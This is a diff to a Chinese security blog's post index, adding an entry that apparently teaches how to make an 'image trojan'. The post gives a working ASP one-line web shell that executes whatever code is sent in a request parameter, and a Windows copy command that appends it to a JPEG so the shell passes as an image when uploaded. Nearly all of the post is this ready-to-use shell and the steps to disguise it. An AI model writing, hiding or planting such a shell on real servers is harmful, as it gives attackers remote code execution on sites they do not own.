@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>图片马制作</title>
+      <link href="/posts/5813.html"/>
+      <url>/posts/5813.html</url>
+      
+        <content type="html"><![CDATA[<p>我把图片命名为zhf111.jpg</p><p>接下来写一句话木马<br>新建一个zhf111.asp文件，写入一句话木马<br>&lt;%Y=request(“Cat00011cat”)%&gt; &lt;%execute(Y)%&gt;</p><p>然后在win+R，cmd，cd到原始图片的目录路径下</p><p>copy zhf111.jpg/b+zhf111.asp/a zhfmua.jpg</p><p>桌面上出现新的图片就是制作出的图片马</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218021115.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>逻辑漏洞</title>
       <link href="/posts/45471.html"/>
       <url>/posts/45471.html</url>
